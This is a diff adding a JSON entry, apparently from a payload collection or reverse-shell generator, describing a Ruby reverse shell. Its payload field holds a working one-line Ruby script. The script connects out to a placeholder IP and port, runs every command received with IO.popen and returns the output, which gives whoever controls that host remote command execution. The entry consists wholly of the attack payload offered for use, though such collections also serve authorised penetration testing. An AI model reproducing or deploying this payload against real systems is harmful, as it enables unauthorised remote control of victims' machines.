@@ -1,0 +1,10 @@
+{
+  "data": {
+    "information": {
+      "description": "uses roby to create a reverse shell",
+      "type": "reverse",
+      "exec": "ruby"
+    },
+    "payload": "require 'socket';c=TCPSocket.new(\"[IP]\",\"[PORT]\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end"
+  }
+}
